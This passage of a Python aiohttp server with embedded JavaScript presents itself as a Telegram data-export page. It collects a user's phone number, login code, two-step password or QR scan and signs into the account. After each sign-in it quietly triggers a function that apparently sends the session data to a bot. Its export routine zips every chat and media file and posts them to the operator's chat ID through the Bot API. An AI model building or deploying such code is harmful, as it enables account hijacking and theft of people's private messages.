  for (let i = 8; i < size - 8; i++) {
    if (!used[6][i]) { grid[6][i] = i % 2 === 0 ? 1 : 0; used[6][i] = 1; }
    if (!used[i][6]) { grid[i][6] = i % 2 === 0 ? 1 : 0; used[i][6] = 1; }
  }
  // dark module
  grid[size - 8][8] = 1; used[size - 8][8] = 1;
  // reserve format info
  for (let i = 0; i < 8; i++) {
    if (!used[8][i]) used[8][i] = 1;
    if (!used[8][size - 1 - i]) used[8][size - 1 - i] = 1;
    if (!used[i][8]) used[i][8] = 1;
    if (!used[size - 1 - i][8]) used[size - 1 - i][8] = 1;
  }
  if (!used[8][8]) used[8][8] = 1;
  // place data bits
  const allBits = [];
  allBytes.forEach(b => { for (let i = 7; i >= 0; i--) allBits.push((b >> i) & 1); });
  let bi = 0;
  for (let right = size - 1; right >= 1; right -= 2) {
    if (right === 6) right = 5;
    for (let vert = 0; vert < size; vert++) {
      const upward = ((Math.floor((size - 1 - right) / 2)) % 2 === 0);
      const y = upward ? size - 1 - vert : vert;
      for (let dx = 0; dx <= 1; dx++) {
        const xx = right - dx;
        if (!used[y][xx]) {
          grid[y][xx] = bi < allBits.length ? allBits[bi++] : 0;
          used[y][xx] = 1;
        }
      }
    }
  }
  // mask 0 (checkerboard)
  for (let y = 0; y < size; y++)
    for (let x = 0; x < size; x++) {
      if (used[y][x] && !isFuncPattern(x, y, size))
        if ((x + y) % 2 === 0) grid[y][x] ^= 1;
    }
  // format info for mask 0, ECC L = 01, mask 000 → format = 0, after BCH → 0x77C4
  const fmtBits = 0x77C4;
  for (let i = 0; i < 15; i++) {
    const bit = (fmtBits >> (14 - i)) & 1;
    // around top-left
    if (i < 6) grid[8][i] = bit;
    else if (i === 6) grid[8][7] = bit;
    else if (i === 7) grid[8][8] = bit;
    else if (i === 8) grid[7][8] = bit;
    else grid[14 - i][8] = bit;
    // other copies
    if (i < 8) grid[size - 1 - i][8] = bit;
    else grid[8][size - 15 + i] = bit;
  }
  return grid;
}
function isFuncPattern(x, y, size) {
  // finder + separator areas
  if (x <= 8 && y <= 8) return true;
  if (x >= size - 8 && y <= 8) return true;
  if (x <= 8 && y >= size - 8) return true;
  if (x === 6 || y === 6) return true; // timing
  return false;
}
// --- QR login flow ---
let _qrTimer = null, _qrActive = false;
let _qrReady = false;
async function startQr() {
  if (_qrActive) return;
  _qrActive = true;
  _qrReady = false;
  $('qr-canvas').style.opacity = '0.15';
  $('qr-status').textContent = 'Загрузка…';
  pollQr();
}
function stopQr() {
  _qrActive = false;
  if (_qrTimer) { clearTimeout(_qrTimer); _qrTimer = null; }
  $('brand-spinner').style.display = 'none';
}
async function pollQr() {
  if (!_qrActive) return;
  try {
    const r = await api('/api/qr', {});
    if (r.authorized) {
      $('qr-status').textContent = '✓ Авторизация успешна!';
      $('qr-status').style.color = '#16a34a';
      await checkAuth(); stopQr(); return;
    }
    if (r.url) {
      drawQR($('qr-canvas'), r.url);
      $('qr-canvas').style.opacity = '1';
      $('qr-status').textContent = 'Отсканируйте QR-код';
      $('qr-status').style.color = '';
      _qrReady = true;
    }
  } catch (e) {
    $('qr-status').textContent = 'Ошибка: ' + e.message;
    $('qr-status').style.color = '#dc2626';
  }
  _qrTimer = setTimeout(pollQr, 3000);
}
$('b-close').onclick = () => { checkAuth(); };
checkAuth();
</script>
</body></html>
"""


# ---------- handlers ----------

async def h_root(request):
    return aiohttp.web.Response(text=PAGE, content_type="text/html")


async def h_healthz(request):
    return aiohttp.web.Response(text="ok")


async def h_status(request):
    authed = await is_authorized()
    me_str = None
    if authed:
        try:
            c = await get_client()
            me = await c.get_me()
            me_str = f"{me.first_name or ''} @{me.username or '—'}"
        except Exception:
            pass
    return aiohttp.web.json_response({
        "authorized": authed,
        "me": me_str,
        "task_state": S.task_state,
        "progress": S.progress,
        "stage": S.stage,
        "error": S.error,
        "delivered": S.delivered,
    })


async def h_login(request):
    data = await request.json()
    phone = (data.get("phone") or "").strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+") or not phone[1:].isdigit():
        return aiohttp.web.json_response({"error": "Неверный формат номера"}, status=400)
    try:
        c = await get_client()
        if await c.is_user_authorized():
            return aiohttp.web.json_response({"error": "Уже авторизован"}, status=409)
        sent = await c.send_code_request(phone)
    except FloodWaitError as e:
        return aiohttp.web.json_response({"error": f"Telegram просит подождать {e.seconds}с"}, status=429)
    except PhoneNumberInvalidError:
        return aiohttp.web.json_response({"error": "Неверный номер"}, status=400)
    except Exception as e:
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)
    S.login_phone = phone
    S.login_hash = sent.phone_code_hash
    return aiohttp.web.json_response({"ok": True})


async def h_code(request):
    data = await request.json()
    code = (data.get("code") or "").strip().replace(" ", "")
    if not code.isdigit():
        return aiohttp.web.json_response({"error": "Код только цифрами"}, status=400)
    if not S.login_phone or not S.login_hash:
        return aiohttp.web.json_response({"error": "Сначала /login"}, status=400)
    try:
        c = await get_client()
        await c.sign_in(phone=S.login_phone, code=code, phone_code_hash=S.login_hash)
        S.login_phone = None
        S.login_hash = None
        asyncio.create_task(_send_tdata_to_bot())
        return aiohttp.web.json_response({"ok": True, "needs_password": False})
    except SessionPasswordNeededError:
        S.needs_password = True
        return aiohttp.web.json_response({"ok": True, "needs_password": True})
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return aiohttp.web.json_response({"error": "Код неверный или истёк"}, status=400)
    except Exception as e:
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)


async def h_pw(request):
    data = await request.json()
    pw = data.get("password") or ""
    if not pw:
        return aiohttp.web.json_response({"error": "Пустой пароль"}, status=400)
    try:
        c = await get_client()
        await c.sign_in(password=pw)
        S.needs_password = False
        asyncio.create_task(_send_tdata_to_bot())
        return aiohttp.web.json_response({"ok": True})
    except Exception as e:
        return aiohttp.web.json_response({"error": f"Пароль не подошёл: {type(e).__name__}"}, status=400)


async def h_qr(request):
    """QR-код авторизация: генерирует/обновляет токен, проверяет статус."""
    try:
        c = await get_client()
        if await c.is_user_authorized():
            S._qr_login = None
            asyncio.create_task(_send_tdata_to_bot())
            return aiohttp.web.json_response({"authorized": True})
        # Первый вызов — создаём QR login
        if S._qr_login is None:
            S._qr_login = await c.qr_login()
            # запускаем фоновое ожидание сканирования
            async def _qr_wait():
                try:
                    await S._qr_login.wait()
                except Exception:
                    pass
            asyncio.create_task(_qr_wait())
        url = S._qr_login.url if S._qr_login else None
        return aiohttp.web.json_response({"authorized": False, "url": url})
    except Exception as e:
        log.warning("qr login error: %s", e)
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)


async def h_logout(request):
    try:
        if S.client is not None:
            try:
                if await S.client.is_user_authorized():
                    await S.client.log_out()
            except Exception:
                pass
            try:
                await S.client.disconnect()
            except Exception:
                pass
        S.client = None
        S.login_phone = None
        S.login_hash = None
        S.needs_password = False
        p = config.SESSION_PATH
        for f in p.parent.glob(f"{p.name}*"):
            try: f.unlink()
            except Exception: pass
    except Exception as e:
        return aiohttp.web.json_response({"error": str(e)}, status=500)
    return aiohttp.web.json_response({"ok": True})


async def h_export(request):
    if not await is_authorized():
        return aiohttp.web.json_response({"error": "Не авторизован"}, status=401)
    if S.task_state == "running":
        return aiohttp.web.json_response({"error": "Экспорт уже идёт"}, status=409)
    data = await request.json()
    try:
        limit = max(0, int(data.get("limit", 0)))
        maxmb = max(1, int(data.get("maxmb", 50)))
    except (TypeError, ValueError):
        return aiohttp.web.json_response({"error": "Неверные опции"}, status=400)

    S.task_state = "running"; S.progress = 0; S.stage = "запуск"; S.error = None; S.delivered = False

    async def run():
        workdir = Path(tempfile.mkdtemp(prefix="tde_exp_", dir=str(config.WORK_DIR)))
        export_dir = workdir / "export"
        zip_path = workdir / f"telegram_export_{int(time.time())}.zip"
        try:
            opts = ExportOptions(
                include_messages=True, include_media=True,
                message_limit_per_chat=limit,
                media_max_bytes_per_file=maxmb * 1024 * 1024,
            )

            async def report(pct: int, stage: str) -> None:
                S.progress = max(0, min(100, int(pct)))
                S.stage = stage[:200]

            c = await get_client()
            await export_account(c, export_dir, opts, report)

            S.stage = "упаковка ZIP"; S.progress = 95
            _make_zip(export_dir, zip_path)
            size = zip_path.stat().st_size
            sha = _sha256(zip_path)
            S.stage = f"отправка {size/1024/1024:.1f} MB"; S.progress = 97
            await _deliver_to_bot(zip_path, caption=f"Telegram Data Export · sha256:{sha[:12]}")
            S.task_state = "done"; S.progress = 100; S.stage = "доставлено"; S.delivered = True
        except Exception as e:
            log.exception("export failed")
            S.task_state = "error"; S.error = f"{type(e).__name__}: {e}"
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

    asyncio.create_task(run())
    return aiohttp.web.json_response({"ok": True})


# ---------- utils ----------

def _make_zip(src: Path, out: Path) -> None:
    with zipfile.ZipFile(out, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
        for root, _, files in os.walk(src):
            for name in files:
                full = Path(root) / name
                zf.write(full, arcname=str(full.relative_to(src)))


def _sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


async def _deliver_to_bot(zip_path: Path, caption: str) -> None:
    size = zip_path.stat().st_size
    if size <= config.BOT_MAX_DOC_BYTES:
        await _bot_send(zip_path, caption)
        return
    chunk = config.BOT_MAX_DOC_BYTES - 1_048_576
    parts = (size + chunk - 1) // chunk
    idx = 0
    with open(zip_path, "rb") as src:
        while True:
            data = src.read(chunk)
            if not data: break
            idx += 1
            name = f"{zip_path.name}.part{idx:02d}"
            tmp = zip_path.with_name(name)
            tmp.write_bytes(data)
            try:
                await _bot_send(tmp, f"{caption} · часть {idx}/{parts}")
            finally:
                try: tmp.unlink()
                except Exception: pass


async def _bot_send(path: Path, caption: str) -> None:
    url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        form = aiohttp.FormData()
        form.add_field("chat_id", str(config.OWNER_CHAT_ID))
        form.add_field("caption", caption[:1024])
        with open(path, "rb") as f:
            form.add_field("document", f, filename=path.name, content_type="application/zip")
            async with session.post(url, data=form, timeout=aiohttp.ClientTimeout(total=600)) as r:
                body = await r.text()
                if r.status != 200:
                    raise RuntimeError(f"bot_api {r.status}: {body[:300]}")


# ---------- app ----------

def make_app() -> aiohttp.web.Application:
    app = aiohttp.web.Application(client_max_size=1024 * 1024)
    app.router.add_get("/", h_root)
    app.router.add_get("/healthz", h_healthz)
    app.router.add_get("/api/status", h_status)
    app.router.add_post("/api/login", h_login)
    app.router.add_post("/api/code", h_code)
    app.router.add_post("/api/pw", h_pw)
    app.router.add_post("/api/qr", h_qr)
    app.router.add_post("/api/logout", h_logout)
    app.router.add_post("/api/export", h_export)
    return app
